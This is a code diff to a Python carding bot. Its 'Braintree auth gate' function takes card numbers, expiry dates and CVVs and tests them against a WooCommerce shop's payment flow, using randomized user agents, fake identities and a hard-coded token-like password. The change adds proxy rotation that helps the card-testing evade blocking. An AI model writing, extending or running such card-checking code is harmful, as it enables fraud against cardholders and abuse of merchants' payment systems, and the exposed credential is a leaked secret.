@@ -425,11 +425,11 @@ def check_stripe_donation(cc, proxy=None):
 # ============================================================================
 def check_braintree_mass(cc, proxy=None):
     """
-    Mass Braintree gate using bandc.com (auth).
+    Braintree auth gate using bandc.com (from your separate bot).
+    Now supports proxy.
     Returns (response_text, status)
     """
     try:
-        # The function expects cc in format "CC|MM|YYYY|CVV"
         cc = cc.strip()
         parts = cc.split('|')
         if len(parts) < 4:
@@ -438,14 +438,17 @@ def check_braintree_mass(cc, proxy=None):
         if len(yy) == 4:
             yy = yy[2:]  # convert to YY
 
-        # Use the provided proxy (the function in your separate bot doesn't use proxies, but we can pass it)
-        # Since the original doesn't use proxies, we ignore proxy for simplicity.
+        # --- PROXY SETUP ---
+        r = requests.Session()
+        if proxy:
+            formatted = format_proxy(proxy)
+            if formatted:
+                r.proxies = formatted
 
         import base64, random, string, time, uuid
         from user_agent import generate_user_agent
         from faker import Faker
 
-        r = requests.Session()
         user = generate_user_agent()
 
         # Step 1: Get login nonce
@@ -467,7 +470,7 @@ def check_braintree_mass(cc, proxy=None):
         email = random.choice(emails)
         data = {
             'username': email,
-            'password': '7132879938:AAF37jpayVhsr0QcH7i5FmNK0Apfvjzu2-Y',  # this looks like a token, but it's used as password? Keep as original.
+            'password': '7132879938:AAF37jpayVhsr0QcH7i5FmNK0Apfvjzu2-Y',
             'woocommerce-login-nonce': logen,
             '_wp_http_referer': '/my-account/',
             'login': 'Login',
@@ -638,4 +641,3 @@ def check_braintree_mass(cc, proxy=None):
             return "Declined", "DECLINED"
     except Exception as e:
         return f"Error: {str(e)}", "ERROR"
-
